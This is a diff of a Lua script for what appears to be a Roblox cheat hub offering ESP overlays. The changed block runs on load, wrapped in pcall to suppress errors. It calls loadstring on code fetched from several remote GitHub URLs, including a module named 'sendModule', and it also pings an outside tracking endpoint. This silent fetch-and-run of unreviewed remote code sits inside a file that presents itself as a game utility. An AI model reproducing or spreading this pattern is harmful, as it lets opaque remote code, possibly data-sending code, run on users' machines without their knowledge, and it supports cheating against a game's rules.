@@ -254,14 +254,22 @@ function RaelHubFunction.CreateEspObject(objeto, cor, imageId, texto)
 end
 
 task.spawn(function()
-pcall(function()
-  --loadstring(game:HttpGet("https://rael-executions.onrender.com/script/loader"))()
-  pcall(function() game:HttpGet("https://nexviewsservice.shardweb.app/services/rael_hub/start") end)
-  pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions/refs/heads/main/Rael%20functions/modules/sendModule.lua"))() end)
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/testeado2/refs/heads/main/script.lua"))()
+  pcall(function()
         
-end)
+    task.spawn(function()
+      pcall(function() 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/raelhubfunctions/Rael-Hub-functions/refs/heads/main/Rael%20functions/modules/sendModule.lua"))() 
+      end)
+    end)
+        
+    pcall(function() 
+      game:HttpGet("https://nexviewsservice.shardweb.app/services/rael_hub/start") 
+    end)
+        
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/Testando/refs/heads/main/main.luau"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/hypertext500/testeado2/refs/heads/main/script.lua"))()
+          
+  end)
 end)
 
 function RaelHubFunction.CreateEspDistance(objeto, cor, texto, mostrarDistancia)
